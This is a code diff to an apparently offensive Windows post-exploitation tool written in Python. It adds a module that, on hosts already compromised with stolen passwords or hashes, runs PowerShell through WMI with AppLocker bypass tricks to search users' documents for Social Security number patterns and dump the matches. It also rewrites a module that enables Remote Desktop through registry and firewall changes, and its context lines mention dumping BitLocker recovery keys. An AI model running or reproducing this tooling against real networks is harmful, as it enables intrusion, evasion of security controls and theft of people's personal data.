@@ -760,6 +760,8 @@ def appLockerBypass3(targetIP, domain, username, password, passwordHash,command)
     cmd = 'C:\windows\\tasks\powershell.exe -ep bypass -Command \"'+command+'\"'
     return cmd
 
+
+
 def appLockerBypass4(targetIP, domain, username, password, passwordHash,command):    
     print (setColor("[*]", bold, color="blue"))+" "+targetIP+":445 | "+(setColor("[applocker]", color="green"))+" | AppLocker Bypass Technique 4"    
     #https://github.com/Cn33liz/CScriptShell
@@ -4134,6 +4136,29 @@ def setupSMBShare():
     cmd="service smbd restart"
     resultList = runCommand(cmd, shell = True, timeout = 120)
 
+def findPII(ip,domain,username,password,passwordHash):
+    cmd = "Get-ChildItem -Path 'c:\\Users' -Recurse -Force -Include *.doc, *.docx, *.xls, *.xlsx, *.txt, *.pdf, *.ppt, *.pptx | Select-String '[0-9]{3}[-| ][0-9]{2}[-| ][0-9]{4}' | Select-Object Path, Line, LineNumber | Export-CSV C:\\windows\\temp\\pii.txt"
+    if applockerBypass==True:
+        newCmd=''
+        randomCount=(randint(1, 3))
+        randomCount=2
+        if randomCount==1:
+            newCmd=appLockerBypass2(ip, domain, username, password, passwordHash,cmd)
+        if randomCount==2:
+            newCmd=appLockerBypass3(ip, domain, username, password, passwordHash,cmd)
+        if randomCount==3:
+            newCmd=appLockerBypass4(ip, domain, username, password, passwordHash,cmd)
+        results,status=runWMIEXEC(ip , domain, username, password, passwordHash, newCmd) 
+        if debugMode==True:
+            print newCmd
+            results
+        command='type c:\\windows\\temp\\pii.txt'
+        results,status=runWMIEXEC(ip, domain, username, password, passwordHash, command)
+        if debugMode==True:
+            print newCmd
+            results
+        return results
+
 def testMS14_068(ip,domain,username,password,passwordHash):
     #Setup SMB Share
     tmpPassList=[]
@@ -4374,6 +4399,7 @@ if args.list_modules:
     tmpResultList.append(['mssqlbrute','Bruteforce MSSQL \'sa\' Account'])
     tmpResultList.append(['mssqldata','Find Interesting Data in MSSQL Databases'])
     tmpResultList.append(['mssqlhash','Dump MSSQL Password Hashes'])
+    tmpResultList.append(['pii','Find and dump PII data'])
     tmpResultList.append(['wdigest','Create the UseLogonCredentials key'])
     #tmpResultList.append(['rdp','Enable Remote Desktop (RDP) on hosts'])
     #tmpResultList.append(['apps','List installed applications on hosts'])
@@ -4906,37 +4932,60 @@ if skipMode==False:
         else:
             print (setColor("\n[+]", bold, color="green"))+" All hosts have been compromised. Continuing with Post Exploitation modules"                
         complete=True
-    if args.module=="rdp":
-        if len(accessAdmHostList)>0:
-            print (setColor("\n[*] Enabling RDP on Hosts that were not enabled", bold, color="green"))
-            if len(rdpList)==len(nbList):
-                print "RDP has been enabled on all hosts"
-            else:
-                dict={}        
-                for x in accessAdmHostList:
-                    ip=x[0]
-                    domain=x[1]
-                    username=x[2]
+
+if args.module=='pii':
+    print (setColor("\nFinding Personally identifiable information (PII)", bold, color="green"))
+    tmpResultList=[]
+    command='Get-ChildItem -Path "c:\\Users" -Recurse -Force -Include *.doc, *.docx, *.xls, *.xlsx, *.txt, *.pdf, *.ppt, *.pptx | Select-String \"[0-9]{3}[-| ][0-9]{2}[-| ][0-9]{4}\" | Select-Object Path, Line, LineNumber | Export-CSV C:\\windows\\pii.txt'
+    for x in accessAdmHostList:
+        ip=x[0]
+        domain=x[1]
+        username=x[2]
+        if len(x[3])==65 and x[3].count(":")==1:
+            passwordHash=x[3]
+            password=None
+        else:
+            password=x[3]
+            passwordHash=None
+        results=findPII(ip,domain,username,password,passwordHash)
+        tmpResultList=results.split("\n")
+        tmpCount=0
+        for x in tmpResultList:
+            if tmpCount>1:
+                print x
+            tmpCount+=1
+
+if args.module=="rdp":
+    if len(accessAdmHostList)>0:
+        print (setColor("\n[*] Enabling RDP on Hosts that were not enabled", bold, color="green"))
+        if len(rdpList)==len(nbList):
+            print "RDP has been enabled on all hosts"
+        else:
+            dict={}        
+            for x in accessAdmHostList:
+                ip=x[0]
+                domain=x[1]
+                username=x[2]
+                password=x[3]
+                if len(x[3])==65 and x[3].count(":")==1:
+                    passwordHash=x[3]
+                    password=None
+                else:
                     password=x[3]
-                    if len(x[3])==65 and x[3].count(":")==1:
-                        passwordHash=x[3]
-                        password=None
-                    else:
-                        password=x[3]
-                        passwordHash=None
-                    if ip not in rdpList:
-                        print "Enabling RDP on Host: "+ip
-                        command=powershellCmdStart+" -Command \"set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name \"fDenyTSConnections\" -Value 0\""
-                        results,status=runWMIEXEC(ip, domain, username, password, passwordHash, command)  
-                        if debugMode==True:
-                            print results  
-                        command='netsh advfirewall firewall set rule name="Remote Desktop (TCP-In)" new enable=Yes profile=domain'
-                        results,status=runWMIEXEC(ip,domain,username,password,passwordHash,command)
-                        command='netsh advfirewall firewall set rule name="Remote Desktop - RemoteFX (TCP-In)" new enable=Yes profile=domain'
-                        results,status=runWMIEXEC(ip,domain,username,password,passwordHash,command)
-                        command='net start TermService'
-                        results,status=runWMIEXEC(ip,domain,username,password,passwordHash,command)
-        os._exit(0)
+                    passwordHash=None
+                if ip not in rdpList:
+                    print "Enabling RDP on Host: "+ip
+                    command=powershellCmdStart+" -Command \"set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name \"fDenyTSConnections\" -Value 0\""
+                    results,status=runWMIEXEC(ip, domain, username, password, passwordHash, command)  
+                    if debugMode==True:
+                        print results  
+                    command='netsh advfirewall firewall set rule name="Remote Desktop (TCP-In)" new enable=Yes profile=domain'
+                    results,status=runWMIEXEC(ip,domain,username,password,passwordHash,command)
+                    command='netsh advfirewall firewall set rule name="Remote Desktop - RemoteFX (TCP-In)" new enable=Yes profile=domain'
+                    results,status=runWMIEXEC(ip,domain,username,password,passwordHash,command)
+                    command='net start TermService'
+                    results,status=runWMIEXEC(ip,domain,username,password,passwordHash,command)
+    os._exit(0)
 '''
 nm = nmap.PortScanner()
 for ip in nbList:
@@ -5579,6 +5628,7 @@ if args.module=="passwords":
                                         count1+=1
                             count+=1
             tmpDoneList.append(x[0])
+
 
     print (setColor("\nDumping Bitlocker Recovery Keys", bold, color="green"))
     tmpResultList=[]
